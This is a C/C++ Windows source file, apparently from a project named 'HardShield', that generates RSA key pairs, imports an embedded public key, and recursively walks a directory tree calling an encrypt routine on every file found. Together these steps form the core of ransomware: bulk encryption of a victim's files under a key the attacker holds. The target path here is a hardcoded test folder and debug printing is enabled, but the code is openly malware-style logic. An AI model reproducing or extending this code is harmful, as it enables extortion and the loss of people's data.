#define HSDEBUG
#include <windows.h>
#include <tchar.h>
#include "Keys.h"
#include "HSCrypto.h"
#include "HSRSA.h"

VOID PrintHex(PBYTE pHexBuf, DWORD dwSizeBuf)
{
	for (int i = 0; i < dwSizeBuf; ++i)
	{
		DEBUG("%02X", pHexBuf[i]);
		if (!((i + 1) % 32))
		{
			DEBUG("\r\n");
		}
	}
}

BOOLEAN GenPairKeysToFile(BCRYPT_ALG_HANDLE hCryptProvider)
{
	BCRYPT_KEY_HANDLE hKeyHdl = INVALID_HANDLE_VALUE;
	BOOLEAN fOk = FALSE;

	if (INVALID_HANDLE_VALUE == hCryptProvider)
	{
		return(FALSE);
	}
	do
	{
		// Gen pub-pri keys
		hKeyHdl = RSA::GenKey(hCryptProvider);
		if (INVALID_HANDLE_VALUE == hKeyHdl)
		{
			break;
		}

		// export pub key to local file 
		fOk = RSA::ExportToFile(hKeyHdl, BCRYPT_RSAPUBLIC_BLOB, TEXT("HardShield.public"));
		if (!fOk)
		{
			break;
		}
		// export pri key to local file
		fOk = RSA::ExportToFile(hKeyHdl, BCRYPT_RSAPRIVATE_BLOB, TEXT("HardShield.private"));
		if (!fOk)
		{
			break;
		}
		fOk = TRUE;
	} while (FALSE);
	
	return(fOk);
}

VOID RSA1()
{
	BCRYPT_ALG_HANDLE hCryptProvider = RSA::InitRSA();
	BCRYPT_KEY_HANDLE hKeyHdl = INVALID_HANDLE_VALUE;

	hKeyHdl = RSA::ImportKeyFromFile(hCryptProvider, BCRYPT_RSAPRIVATE_BLOB, TEXT("HardShield.private"));
	//printf("Origin: \r\n%s\r\n\r\n", ucTestAry);
	//RSA::Encrypt(hKeyHdl, ucTestAry, 11, ucCipher, sizeof(ucCipher), &cbCipher);
	//printf("key: \r\n");
	//PrintHex(ucCipher, cbCipher);
	//printf("\r\ndec: \r\n");

	//RSA::Decrypt(hKeyHdl, ucCipher, sizeof(ucCipher), ucPlain, sizeof(ucPlain), &cbPlain);
	//printf("%s\r\n", ucPlain);
}

CRYPTO stCrytpObj = { 0 };

BOOLEAN TraverseDirectory(LPCTSTR lpcszPathName)
{
	WIN32_FIND_DATA stData = { 0 };
	TCHAR* ptzFind = nullptr;
	TCHAR* ptzFile = nullptr;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	if (!lpcszPathName)
	{
		return(FALSE);
	}

	ptzFind = new TCHAR[MAX_PATH]{ 0 };
	ptzFile = new TCHAR[MAX_PATH]{ 0 };
	
	wsprintf(ptzFile, TEXT("%s\\*.*"), lpcszPathName);
	hFind = FindFirstFile(ptzFile, &stData);
	if (INVALID_HANDLE_VALUE == hFind)
	{
		return(FALSE);
	}
	do 
	{
		if (stData.cFileName[0] == '.')
		{
			continue;
		}
		sprintf(ptzFind, TEXT("%s\\%s"), lpcszPathName, stData.cFileName);
		if (stData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			TraverseDirectory(ptzFind);
		}
		else
		{
			DEBUG(TEXT("Crypto: %s\r\n"), ptzFind);
			Crypto::Encrypt(&stCrytpObj, ptzFind);
		}

	} while (FindNextFile(hFind, &stData));

	if (INVALID_HANDLE_VALUE != hFind)
	{
		FindClose(hFind);
		hFind = INVALID_HANDLE_VALUE;
	}
	if (ptzFile)
	{
		delete[] ptzFile;
		ptzFile = nullptr;
	}
	if (ptzFind)
	{
		delete[] ptzFind;
		ptzFind = nullptr;
	}

	return(TRUE);
}

int main()
{
	
	BOOLEAN fOk = FALSE;

	fOk = Crypto::InitCrypto(&stCrytpObj);
	if (!fOk)
	{
		return(-1);
	}
	fOk = Crypto::ImportPublicKey(&stCrytpObj, HSPublicKey, HSPublicKeySize());
	if (!fOk)
	{
		return(-1);
	}
	TraverseDirectory(TEXT("C:\\Users\\user\\Desktop\\1"));

	system("pause");

	return(0);
}